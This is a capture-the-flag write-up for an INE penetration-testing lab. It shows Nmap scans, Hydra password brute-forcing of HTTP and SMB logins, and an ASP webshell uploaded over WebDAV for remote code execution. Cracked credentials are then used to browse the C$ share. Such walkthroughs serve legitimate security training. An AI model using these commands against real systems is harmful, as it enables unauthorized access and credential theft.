## Host & Network Penetration Testing: System-Host Based Attacks CTF 1


### Flag 1: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)

We start with an Nmap scan on target1.ine.local, discovering some ports open.
```
nmap -sS -Pn -p- -T4 target1.ine.local
```
```
nmap -sS -Pn -sV -p 80,135,139,445,3389,5985,47001 -T4 target1.ine.local
```
After narrowing down the search with Nmap, we are unable to discover anything interesting, so we check the target with a web browser.

Upon connecting, the target site asks for username and password.
Following the hint from the track, we proceed with a brute force attack using Hydra and the wordlist provided.
```
hydra -l bob -P /root/Desktop/wordlists/wordlists/100-common-passwords.txt target1.ine.local http-get /robots.txt
```
Unfortunately, nothing interesting is found, so we proceed with another list, which helps us find the correct password:
```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get / 
```
```
bob -> password_123321
```
With these credentials, we proceed with folder enumeration using Gobuster:
```
gobuster dir -u http://target1.ine.local/ -w /usr/share/wordlists/dirb/common.txt -U bob -P password_123321
```
The scan reveals a WebDAV server containing the first flag.


### Flag 2: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

We choose to use Cadaver to upload a webshell, which is useful to explore C: drive as instructed by the track, using the username and password previously discovered.
```
cadaver http://target1.ine.local/webdav/
```
Then we upload the webshell.asp file:
```
put /usr/share/webshells/asp/webshell.asp 
```
We execute it in the browser, gaining remote code execution.

Typing:
```
type c:\flag2.txt
```
allow us to retrieve the second flag.

### Flag 3: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)

We begin with a generic Nmap scan and another focusing on port 445:
```
nmap -sS -p- -T4 target2.ine.local
```
```
nmap -sS -p445 target2.ine.local --script smb-enum-*
```
The second scan is unproductive, taking too long to complete.
So we proceed with:
```
nmap -sS -p445 target2.ine.local --script smb-enum-shares
```
discovering that there is a share named Shared. We then use Hydra to brute force the SMB service:
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local/shared
```
We discover the following usernames and passwords
```
rooty -> spongebob
demo -> password1
auditor -> hellokitty
administrator -> pineapple
```
Although shared folder is not useful, we are able to try with C$ folder using administrator credentials
```
smbclient //target2.ine.local/C$/ -U administrator
```
We find the third flag in this folder and download it with:
```
get flag3.txt
```

### Flag 4: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

Following the track hint, we navigate to the Desktop directory of the administrator users and discover the fourth flag.
